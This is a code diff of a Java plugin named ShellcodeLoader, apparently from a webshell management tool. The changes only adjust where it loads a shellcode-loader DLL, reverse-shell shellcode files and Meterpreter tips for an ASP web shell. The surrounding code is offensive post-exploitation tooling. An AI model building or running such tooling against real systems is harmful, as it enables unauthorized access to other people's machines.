@@ -102,7 +102,7 @@ public class ShellcodeLoader implements Plugin {
     private void loadButtonClick(ActionEvent actionEvent) {
         if (!this.loadState) {
             try {
-                InputStream inputStream = getClass().getResourceAsStream("assets/ShellcodeLoader.dll");
+                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/asp/assets/ShellcodeLoader.dll");
                 byte[] data = functions.readInputStream(inputStream);
                 inputStream.close();
                 if (this.payload.include(CLASS_NAME, data)) {
@@ -164,7 +164,7 @@ public class ShellcodeLoader implements Plugin {
             Class<?> cls = getClass();
             Object[] objArr = new Object[1];
             objArr[0] = is64 ? "64" : "";
-            InputStream inputStream = cls.getResourceAsStream(String.format("assets/reverse%s.bin", objArr));
+            InputStream inputStream = cls.getClassLoader().getResourceAsStream(String.format("shell/asp/assets/reverse%s.bin", objArr));
             String shellcodeHex2 = new String(functions.readInputStream(inputStream));
             try {
                 inputStream.close();
@@ -187,7 +187,7 @@ public class ShellcodeLoader implements Plugin {
     private void updateMeterpreterTip() {
         try {
             boolean is64 = this.is64CheckBox.isSelected();
-            InputStream inputStream = getClass().getResourceAsStream("assets/meterpreterTip.txt");
+            InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/asp/assets/meterpreterTip.txt");
             String tipString = new String(functions.readInputStream(inputStream));
             inputStream.close();
             this.tipTextArea.setText(tipString.replace("{arch}", is64 ? "/x64" : ""));
